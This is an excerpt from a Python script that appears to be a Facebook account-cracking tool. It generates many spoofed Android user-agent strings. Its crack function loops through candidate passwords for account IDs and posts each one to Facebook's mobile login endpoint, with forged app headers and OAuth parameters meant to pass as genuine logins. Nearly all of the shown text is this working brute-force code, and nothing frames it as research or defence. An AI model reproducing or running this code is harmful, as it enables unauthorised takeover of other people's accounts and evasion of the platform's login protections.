...
for khontol in range(9999):
    ...
    ua_aink=(f'{kyu1}')
    raka.append(ua_aink)
    kyu2 = f'Mozilla/5.0 (Linux; Android {android_versi}; zh-tw; MI 9 Transparent Edition Build/QKQ1.190825.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{chrome_versi} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.7.520830 swan-mibrowser'
    ua_aink=(f'{kyu2}')
    raka.append(ua_aink)
    kyu3 = f'Mozilla/5.0 (Linux; Android {android_versi}; GT-N8013 Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_versi} Mobile Safari/537.36'
    ua_aink=(f'{kyu3}')
    raka.append(ua_aink)
    kyu4 = f'Mozilla/5.0 (Linux; Android {android_versi}; en-us; KFAPWA Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/{chrome_versi} Safari/537.36'
    ua_aink=(f'{kyu4}')
    raka.append(ua_aink)
    kyu5 = f'Mozilla/5.0 (Linux; Android {android_versi}; Nokia X20 Build/SKQ1.210821.001; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/{chrome_versi} Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/370.0 .0.14.108;]'
    ua_aink=(f'{kyu5}')
    raka.append(ua_aink)
    kyu6 = f'Mozilla/5.0 (Linux; Android {android_versi}; es-us; Redmi Note 9T Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{chrome_versi} Mobile Safari/537.36 XiaoMi/MiuiBrowser/13.35.0-gn'
    ua_aink=(f'{kyu6}')
    raka.append(ua_aink)
    kyu7 = f'Mozilla/5.0 (Linux; Android {android_versi}; SM-N975U1 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{chrome_versi} Mobile Safari/537.36 AlohaLite/1.7.3 AlohaBrowser/4.1.4'
    ua_aink=(f'{kyu7}')
    raka.append(ua_aink)
###----------[ WARNA PRINT RICH ]---------- ###
M2 = "[#FF0000]" # MERAH
...
def crack(idf,pwv,awal):
	...
	for pw in pwv:
		try:
			...
			link = ses.get('https://m.alpha.facebook.com/login.php?skip_api_login=1&api_key=953097631439235&kid_directed_site=0&app_id=953097631439235&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv11.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D953097631439235%26cbt%3D1694348542457%26e2e%3D%257B%2522init%2522%253A1694348542457%257D%26ies%3D1%26sdk%3Dandroid-11.3.0%26sso%3Dchrome_custom_tab%26nonce%3D4f5ac460-eb0b-4aa6-bbb7-03ea8c6cf2a5%26scope%3Dopenid%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%25224f5ac460-eb0b-4aa6-bbb7-03ea8c6cf2a5%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522op5ocejj12h7brch9ia4%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb953097631439235%253A%252F%252Fauthorize%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D4f5ac460-eb0b-4aa6-bbb7-03ea8c6cf2a5%26tp%3Dunspecified&cancel_url=fb953097631439235%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25224f5ac460-eb0b-4aa6-bbb7-03ea8c6cf2a5%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522op5ocejj12h7brch9ia4%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			data = {
...
'bi_xrwh': 0
			...
			headers = {'Host': 'm.alpha.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','facebook-api-version': 'v12.0','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-request-id': 'A3PUDZnzy2xgkMAkH9bcVof','x-fb-trace-id': 'A9UI4F8y6Z523ZwMtgZ2Yru','x-fb-rev': '1007127514','x-fb-debug': 'xuYuLDWA/GWF3IQkR3W8JpeAfMekbJ2MX1zjbPhU6FD7RN052RJ3YA0vIwYJgzJ8gf0On/L8J1dfLZVTy5OtrQ==','content-length': '0','cache-control': 'max-age=0','sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://m.alpha.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://m.alpha.facebook.com/login.php?skip_api_login=1&api_key=953097631439235&kid_directed_site=0&app_id=953097631439235&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv11.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D953097631439235%26cbt%3D1694348542457%26e2e%3D%257B%2522init%2522%253A1694348542457%257D%26ies%3D1%26sdk%3Dandroid-11.3.0%26sso%3Dchrome_custom_tab%26nonce%3D4f5ac460-eb0b-4aa6-bbb7-03ea8c6cf2a5%26scope%3Dopenid%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%25224f5ac460-eb0b-4aa6-bbb7-03ea8c6cf2a5%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522op5ocejj12h7brch9ia4%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb953097631439235%253A%252F%252Fauthorize%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D4f5ac460-eb0b-4aa6-bbb7-03ea8c6cf2a5%26tp%3Dunspecified&cancel_url=fb953097631439235%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25224f5ac460-eb0b-4aa6-bbb7-03ea8c6cf2a5%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522op5ocejj12h7brch9ia4%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			po = ses.post('https://m.alpha.facebook.com/login/device-based/login/async/?api_key=953097631439235&auth_token=d1b1e70a17b3aa227143c3d11620b710&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv11.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D953097631439235%26cbt%3D1694348542457%26e2e%3D%257B%2522init%2522%253A1694348542457%257D%26ies%3D1%26sdk%3Dandroid-11.3.0%26sso%3Dchrome_custom_tab%26nonce%3D4f5ac460-eb0b-4aa6-bbb7-03ea8c6cf2a5%26scope%3Dopenid%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%25224f5ac460-eb0b-4aa6-bbb7-03ea8c6cf2a5%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522op5ocejj12h7brch9ia4%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb953097631439235%253A%252F%252Fauthorize%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D4f5ac460-eb0b-4aa6-bbb7-03ea8c6cf2a5%26tp%3Dunspecified&refsrc=deprecated&app_id=953097631439235&cancel=fb953097631439235%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25224f5ac460-eb0b-4aa6-bbb7-03ea8c6cf2a5%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522op5ocejj12h7brch9ia4%2522%257D%23_%3D_&lwv=100',data=data,headers=headers,allow_redirects=False)
